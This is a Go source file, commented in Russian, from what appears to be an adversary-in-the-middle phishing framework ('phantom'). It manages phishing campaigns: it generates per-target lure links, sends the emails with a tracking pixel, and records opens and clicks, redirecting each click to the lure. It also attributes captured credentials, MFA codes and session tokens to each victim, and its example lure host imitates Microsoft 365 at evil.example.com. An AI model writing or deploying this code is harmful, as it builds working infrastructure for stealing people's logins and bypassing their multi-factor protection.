// Service связывает кампании с движком: per-target smart-lures,
// рассылка с трекинг-пикселем, трекинг-хендлер /__tr/*, атрибуция
// submit через EventBus (capture.* несут path -> TargetByLure).
package campaign

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/phantom-v2/phantom/internal/lures"
	"github.com/phantom-v2/phantom/internal/mailer"
)

// Subscriber — минимальная подписка (реализация *events.Bus).
type Subscriber interface {
	Subscribe(topic string, buf int) <-chan any
}

type Service struct {
	Campaigns *Store
	Lures     *lures.Store
	Mail      *mailer.Sender
}

// Launch стартует кампанию и создает персональную smart-приманку
// на каждую цель (TTL кампании, MaxUses кампании).
func (s *Service) Launch(id string) ([]*Target, error) {
	targets, err := s.Campaigns.Launch(id)
	if err != nil {
		return nil, err
	}
	c, _ := s.Campaigns.Get(id)
	exp := time.Time{}
	if c.TTLMin > 0 {
		exp = time.Now().Add(time.Duration(c.TTLMin) * time.Minute)
	}
	for _, t := range targets {
		_ = s.Lures.SmartCreate(lures.Smart{
			Path: t.LurePath, PhishletID: c.PhishletID,
			ExpiresAt: exp, MaxUses: c.MaxUses,
		})
	}
	return targets, nil
}

// SendAll рассылает письма с персональными URL + пиксель open.
// urlBase вида https://m365.evil.example.com (без слэша на конце).
func (s *Service) SendAll(id, subject, body, urlBase string) (int, error) {
	if _, ok := s.Campaigns.Get(id); !ok {
		return 0, fmt.Errorf("unknown campaign")
	}
	sent := 0
	for _, t := range s.Campaigns.Targets(id) {
		link := strings.TrimSuffix(urlBase, "/") + t.LurePath
		pixel := strings.TrimSuffix(urlBase, "/") + "/__tr/o?tid=" + t.ID
		m := mailer.Mail{
			To: t.Email, Subject: subject,
			Body:  body + `<img src="` + pixel + `" width="1" height="1" alt="">`,
			URL:   link,
			Email: t.Email,
		}
		if err := s.Mail.Send(m); err != nil {
			return sent, fmt.Errorf("send %s: %w", t.Email, err)
		}
		s.Campaigns.Mark(t.ID, "sent")
		sent++
	}
	return sent, nil
}

// Targets возвращает цели кампании (для SendAll/API).
func (s *Store) Targets(id string) []*Target { return s.targetsFor(id) }

var pixel = []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

// Tracker обслуживает /__tr/* локально (не проксируется):
// o?tid= — пиксель open; c?tid=&to=/l/.. — клик + 302 на приманку.
type Tracker struct {
	Campaigns *Store
}

func (t Tracker) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	tid := r.URL.Query().Get("tid")
	switch {
	case r.URL.Path == "/__tr/o" && tid != "":
		t.Campaigns.Mark(tid, "open")
		w.Header().Set("Content-Type", "image/gif")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write(pixel)
	case r.URL.Path == "/__tr/c" && tid != "":
		to := r.URL.Query().Get("to")
		if !strings.HasPrefix(to, "/l/") {
			http.Error(w, "bad target", http.StatusBadRequest)
			return
		}
		t.Campaigns.Mark(tid, "click")
		http.Redirect(w, r, to, http.StatusFound)
	default:
		http.NotFound(w, r)
	}
}

// Watch приписывает submit: capture-события с path резолвятся в цель.
func (s *Service) Watch(ctx context.Context, sub Subscriber) {
	for _, topic := range []string{"capture.creds", "capture.mfa", "capture.token"} {
		ch := sub.Subscribe(topic, 64)
		go func(ch <-chan any) {
			for {
				select {
				case <-ctx.Done():
					return
				case v := <-ch:
					m, ok := v.(map[string]string)
					if !ok {
						continue
					}
					if path, ok := m["path"]; ok && path != "" {
						if t, ok := s.Campaigns.TargetByLure(path); ok {
							s.Campaigns.Mark(t.ID, "submit")
						}
					}
				}
			}
		}(ch)
	}
}

// Делегирование store для API-слоя (CampService).
func (s *Service) Create(name, phishletID string, ttlMin, maxUses int) *Campaign {
	return s.Campaigns.Create(name, phishletID, ttlMin, maxUses)
}

func (s *Service) AddTargets(campaignID string, emails []string) int {
	return s.Campaigns.AddTargets(campaignID, emails)
}

func (s *Service) Stats(id string) (sent, opened, clicked, submitted, total int) {
	return s.Campaigns.Stats(id)
}

func (s *Service) Get(id string) (*Campaign, bool) {
	return s.Campaigns.Get(id)
}

func (s *Service) List() []*Campaign {
	return s.Campaigns.List()
}
